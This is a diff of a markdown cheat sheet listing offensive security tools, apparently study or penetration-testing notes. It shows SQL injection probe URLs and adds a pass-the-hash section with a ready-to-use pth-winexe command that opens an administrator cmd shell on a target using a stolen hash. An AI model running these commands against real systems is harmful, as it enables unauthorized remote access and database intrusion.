@@ -1,5 +1,5 @@
 ---
-title: CISA Tools - Reconnaissance
+title: CISA Tools
 ---
 # List of Tools for CISA
 ## Network Reconnaissance
@@ -137,3 +137,9 @@ http://site/name.php?henryearl=-1
 http://site/name.php?henryearl=-1'
 ```
 [Thanks to Database Tutorials](https://www.youtube.com/watch?v=oWHKIiRGjtQ)
+
+## Pass the Hash
+### pth-winexe
+Pass the Hash of a user and open a cmd shell. 
+```
+pth-winexe -u administrator%"hash"//"target ip" cmd.exe
